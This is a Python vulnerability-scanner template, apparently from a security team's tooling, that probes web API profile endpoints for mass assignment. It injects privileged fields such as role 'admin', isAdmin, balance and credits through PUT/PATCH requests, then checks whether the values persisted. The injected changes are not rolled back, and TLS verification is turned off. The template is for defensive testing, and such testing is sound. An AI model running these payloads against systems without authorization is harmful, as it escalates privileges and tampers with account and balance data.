#!/usr/bin/env python3
#
# @id: mass-assignment-update
# @name: Mass Assignment via Profile / Object Update Endpoint
# @author: BugB Security Team
# @severity: high
# @description: Tests for mass assignment vulnerabilities by injecting privileged fields (role, isAdmin, balance, credits) into PUT/PATCH profile or object update requests. Confirms by re-fetching the object and checking if injected values were persisted.
# @tags: mass-assignment,broken-access-control,owasp-a06,owasp-a01,privilege-escalation,object-property-injection
# @cwe: CWE-915
# @cvss: 8.3
# @confidence: 82
# @version: 1.0.0
# @references: https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/,https://cwe.mitre.org/data/definitions/915.html,https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
# @context_vars: auth_token:required, endpoints[]:optional, user_id:optional
# @vuln_class: mass_assignment
# @hypothesis_tags: mass-assignment, property-injection, privilege-escalation, broken-object-property-level-authorization, bopla
# @batch_group: auth-context
# @auto_probe: false
#

import json
import os
import requests
import urllib3
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEMPLATE_ID   = "mass-assignment-update"
TEMPLATE_NAME = "Mass Assignment via Profile / Object Update Endpoint"

# Fields to inject and what to verify persisted
PRIVILEGED_FIELDS = [
    # (inject_payload, verify_key, verify_value, description)
    ({"role": "admin"},         "role",     "admin",   "role escalation to admin"),
    ({"isAdmin": True},         "isAdmin",  True,      "isAdmin flag injection"),
    ({"is_admin": True},        "is_admin", True,      "is_admin flag injection"),
    ({"admin": True},           "admin",    True,      "admin boolean injection"),
    ({"credits": 9999},         "credits",  9999,      "credits/balance inflation"),
    ({"balance": 9999},         "balance",  9999,      "balance inflation"),
    ({"wallet": 9999},          "wallet",   9999,      "wallet balance inflation"),
    ({"verified": True},        "verified", True,      "verified status injection"),
    ({"emailVerified": True},   "emailVerified", True, "email verification bypass"),
    ({"active": True},          "active",   True,      "account activation injection"),
    ({"plan": "premium"},       "plan",     "premium", "plan upgrade injection"),
    ({"subscription": "pro"},   "subscription", "pro", "subscription upgrade injection"),
]

# ── Helpers ────────────────────────────────────────────────────────────────────

def get_target() -> Tuple[Optional[str], int]:
    host = os.environ.get("CERT_X_GEN_TARGET_HOST")
    port = int(os.environ.get("CERT_X_GEN_TARGET_PORT", "80"))
    return host, port

def get_context() -> Dict[str, Any]:
    raw = os.environ.get("CERT_X_GEN_CONTEXT", "{}")
    try:
        return json.loads(raw)
    except Exception:
        return {}

def build_base_url(host: str, port: int) -> str:
    scheme = "https" if port == 443 else "http"
    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
        return f"{scheme}://{host}"
    return f"{scheme}://{host}:{port}"

def build_auth_headers(ctx: Dict[str, Any], extra: Dict[str, str] = None) -> Dict[str, str]:
    headers = {"User-Agent": "CXG-MassAssign-Scanner/1.0", "Accept": "application/json"}
    token = ctx.get("auth_token") or ctx.get("bearer_token")
    if token:
        if not token.lower().startswith("bearer "):
            token = f"Bearer {token}"
        headers["Authorization"] = token
    cookie = ctx.get("session_cookie") or ctx.get("cookie")
    if cookie:
        headers["Cookie"] = cookie
    if extra:
        headers.update(extra)
    return headers

def missing_context_finding(host: str) -> Dict[str, Any]:
    return {
        "template_id": TEMPLATE_ID,
        "template_name": TEMPLATE_NAME,
        "host": host,
        "matched_at": host,
        "severity": "info",
        "confidence": 100,
        "title": "Template requires context: auth_token missing",
        "description": (
            f"{TEMPLATE_NAME} needs an authenticated session. "
            "Re-run with: --context '{\"auth_token\":\"Bearer <token>\",\"endpoints\":[\"/api/users/1\"]}'"
        ),
        "evidence": {"missing_vars": ["auth_token"]},
        "cwe": "CWE-915",
        "cvss_score": 0.0,
        "remediation": "Provide auth_token via --context flag.",
        "references": [],
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

# ── HTTP helpers ───────────────────────────────────────────────────────────────

SESSION = requests.Session()
SESSION.verify = False

def fetch_json(url: str, headers: Dict[str, str]) -> Optional[Dict]:
    try:
        r = SESSION.get(url, headers=headers, timeout=7)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def discover_profile_endpoints(
    base_url: str,
    auth_headers: Dict[str, str],
    provided: List[str],
) -> List[Tuple[str, str]]:
    """
    Returns list of (get_url, update_url) tuples where:
    - get_url returns current user object (GET 200)
    - update_url accepts PUT/PATCH (405 or 200 — exists)
    """
    candidates = list(provided) if provided else []
    candidates += [
        "/api/me", "/api/v1/me", "/rest/user/whoami",
        "/api/user", "/api/profile", "/api/v1/profile",
        "/api/account", "/api/v1/account",
    ]
    results = []
    seen = set()

    for ep in candidates:
        get_url = ep if ep.startswith("http") else base_url + ep
        if get_url in seen:
            continue
        seen.add(get_url)

        try:
            get_r = SESSION.get(get_url, headers=auth_headers, timeout=6)
        except Exception:
            continue

        if get_r.status_code != 200:
            continue

        try:
            body = get_r.json()
            if not isinstance(body, dict):
                continue
        except Exception:
            continue

        # Derive PUT/PATCH URL — may be same or have /update suffix
        update_candidates = [get_url, get_url.rstrip("/") + "/update"]
        for update_url in update_candidates:
            try:
                probe = SESSION.put(
                    update_url,
                    headers={**auth_headers, "Content-Type": "application/json"},
                    json={"_probe": True},
                    timeout=6,
                )
                # Any response other than 404 means endpoint exists
                if probe.status_code != 404:
                    results.append((get_url, update_url, body))
                    break
            except Exception:
                pass

    return results

def send_mass_assign(
    update_url: str,
    auth_headers: Dict[str, str],
    payload: Dict,
) -> Optional[int]:
    hdrs = {**auth_headers, "Content-Type": "application/json"}
    for method in (SESSION.put, SESSION.patch):
        try:
            r = method(update_url, headers=hdrs, json=payload, timeout=7)
            if r.status_code in (200, 201, 204):
                return r.status_code
        except Exception:
            pass
    return None

def value_persisted(body: Dict, key: str, expected: Any) -> bool:
    """Check nested dict for key=expected_value."""
    if key in body:
        return body[key] == expected
    # Nested under 'data', 'user', 'profile'
    for wrapper in ("data", "user", "profile", "account"):
        if wrapper in body and isinstance(body[wrapper], dict):
            if body[wrapper].get(key) == expected:
                return True
    return False

# ── Core test ─────────────────────────────────────────────────────────────────

def test_endpoint(
    get_url: str,
    update_url: str,
    original_body: Dict,
    auth_headers: Dict[str, str],
    host: str,
) -> List[Dict[str, Any]]:
    findings = []

    for inject_payload, verify_key, verify_value, description in PRIVILEGED_FIELDS:
        # Skip if field already at target value in the original response
        if value_persisted(original_body, verify_key, verify_value):
            continue

        status = send_mass_assign(update_url, auth_headers, inject_payload)
        if status is None:
            continue

        # Re-fetch and check if value persisted
        refreshed = fetch_json(get_url, auth_headers)
        if refreshed and value_persisted(refreshed, verify_key, verify_value):
            findings.append({
                "template_id": TEMPLATE_ID,
                "template_name": TEMPLATE_NAME,
                "host": host,
                "matched_at": update_url,
                "severity": "high",
                "confidence": 92,
                "title": f"Mass Assignment confirmed: {description}",
                "description": (
                    f"Injecting `{json.dumps(inject_payload)}` into {update_url} "
                    f"caused the field `{verify_key}` to persist with value `{verify_value}`. "
                    "The server accepted and stored a privileged field that should be read-only."
                ),
                "evidence": {
                    "update_url": update_url,
                    "injected_payload": inject_payload,
                    "verify_key": verify_key,
                    "verify_value": verify_value,
                    "update_status": status,
                    "refreshed_value": refreshed.get(verify_key, "nested"),
                    "description": description,
                },
                "cwe": "CWE-915",
                "cvss_score": 8.3,
                "remediation": (
                    "Use an allowlist of accepted fields for every update endpoint. "
                    "Never pass user-supplied JSON directly to ORM update methods. "
                    "Explicitly reject or ignore fields like role, isAdmin, balance, credits. "
                    "Use separate DTOs (Data Transfer Objects) for input validation."
                ),
                "references": [
                    "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
                    "https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/",
                    "https://cwe.mitre.org/data/definitions/915.html",
                ],
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })

    return findings

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    host, port = get_target()
    if not host:
        print(json.dumps({"findings": []}))
        return

    ctx = get_context()

    if not (ctx.get("auth_token") or ctx.get("bearer_token") or ctx.get("session_cookie")):
        print(json.dumps({"findings": [missing_context_finding(host)]}))
        return

    base_url = build_base_url(host, port)
    auth_headers = build_auth_headers(ctx)
    endpoints = ctx.get("endpoints", [])

    profile_endpoints = discover_profile_endpoints(base_url, auth_headers, endpoints)
    if not profile_endpoints:
        print(json.dumps({"findings": []}))
        return

    all_findings = []
    for get_url, update_url, original_body in profile_endpoints:
        findings = test_endpoint(get_url, update_url, original_body, auth_headers, host)
        all_findings.extend(findings)

    print(json.dumps({"findings": all_findings}))

if __name__ == "__main__":
    main()
